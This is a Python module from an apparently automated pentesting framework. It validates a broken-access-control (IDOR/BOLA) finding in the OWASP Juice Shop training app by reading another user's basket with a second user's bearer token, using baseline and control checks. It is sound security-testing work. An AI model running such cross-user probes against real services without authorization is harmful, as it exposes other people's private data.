"""Juice Shop-specific basket IDOR technique.

Enumerates each identity's basket_id (from the /whoami / login response),
then makes the cross-user request GET /rest/basket/{other_identity_basket_id}
under identity A's token. A CONFIRMED finding requires:

  1. Identity A can read its own basket (200)                     — baseline
  2. Identity A can read Identity B's basket by ID (200)          — differential
  3. Identity B can read its own basket (200)                     — positive control
  4. No auth request is denied (401 / 200 with anon basket)       — negative control

If (2) succeeds, that is a confirmed BOLA — the auth layer accepts B's basket
ID under A's token.
"""
from __future__ import annotations

import json
from dataclasses import dataclass, field
from typing import Any

TECHNIQUE_ID = "juice_shop_basket_idor"
TECHNIQUE_NAME = "Juice Shop basket IDOR"
CWE = "CWE-639"
OWASP = "A01:2021 — Broken Access Control"


@dataclass
class ExchangeResult:
    label: str
    url: str
    status_code: int
    matched: bool
    body_preview: str = ""


@dataclass
class ValidationResult:
    finding_status: str  # CONFIRMED | INCONCLUSIVE | REJECTED
    reason: str
    exchanges: list[dict[str, Any]] = field(default_factory=list)


async def _get_basket_id(client, base: str, token: str) -> int | None:
    """Return the basket_id owned by the token holder, or None."""
    try:
        r = await client.get(
            f"{base}/rest/user/whoami",
            headers={"Authorization": f"Bearer {token}"},
        )
    except Exception:
        return None
    if r.status_code != 200:
        return None
    try:
        payload = r.json()
    except Exception:
        return None
    user = payload.get("user") or {}
    bid = user.get("bid") or user.get("basketId") or user.get("BasketId")
    if isinstance(bid, int):
        return bid
    if isinstance(bid, str) and bid.isdigit():
        return int(bid)
    return None


async def validate(
    *,
    client,
    base_url: str,
    identity_a: dict[str, str],  # {"persona":..., "token":...}
    identity_b: dict[str, str],
) -> ValidationResult:
    """Enumerate each identity's basket_id, then defer to the generic protocol."""
    from packs.techniques.web_authz.parameterized_idor import run_parameterized_idor

    base = base_url.rstrip("/")
    token_a = identity_a.get("token", "")
    token_b = identity_b.get("token", "")

    if not token_a or not token_b:
        return ValidationResult(
            finding_status="INCONCLUSIVE",
            reason="both identities need real bearer tokens for a differential probe",
        )

    # Prefer the basket id supplied by the login response (identity activity
    # extracts it from Juice Shop's authentication.bid); fall back to whoami.
    basket_a = identity_a.get("object_id") or await _get_basket_id(client, base, token_a)
    basket_b = identity_b.get("object_id") or await _get_basket_id(client, base, token_b)
    if basket_a is None or basket_b is None or basket_a == basket_b:
        return ValidationResult(
            finding_status="INCONCLUSIVE",
            reason=(
                f"could not enumerate distinct basket ids (a={basket_a!r}, b={basket_b!r})"
            ),
        )

    result = await run_parameterized_idor(
        client=client,
        url_template=f"{base}/rest/basket/{{id}}",
        id_a=basket_a,
        id_b=basket_b,
        token_a=token_a,
        token_b=token_b,
        persona_a=identity_a.get("persona", "identity_a"),
        persona_b=identity_b.get("persona", "identity_b"),
    )
    return ValidationResult(
        finding_status=result.finding_status,
        reason=result.reason,
        exchanges=[e.to_dict() for e in result.exchanges],
    )
